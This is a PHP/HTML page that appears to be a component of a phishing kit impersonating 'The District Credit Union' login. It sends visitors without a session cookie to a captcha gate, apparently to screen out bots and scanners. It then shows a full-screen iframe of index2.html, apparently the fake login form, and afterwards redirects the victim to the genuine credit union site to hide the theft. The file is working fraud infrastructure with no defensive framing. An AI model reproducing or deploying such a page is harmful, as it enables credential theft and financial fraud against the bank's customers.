<?php
if (isset($_COOKIE["session_id"])) {}
else {
    header('Location: captcha.php');
    exit;
}
?>
<title>The District Credit Union - Log On</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    } body {
        overflow-x: hidden;
        overflow-y: hidden;
    } iframe {
        width: 100%;
        height: 100%;
        border: none
    }
</style>
<iframe src="index2.html"></iframe>

<script>
    window.addEventListener('message', function(event) {
      if (event.data === 'redirect') {
        // Redirect the parent page to a new URL
        window.location.href = 'https://www.districtcreditunion.com';
      }
    });
</script>  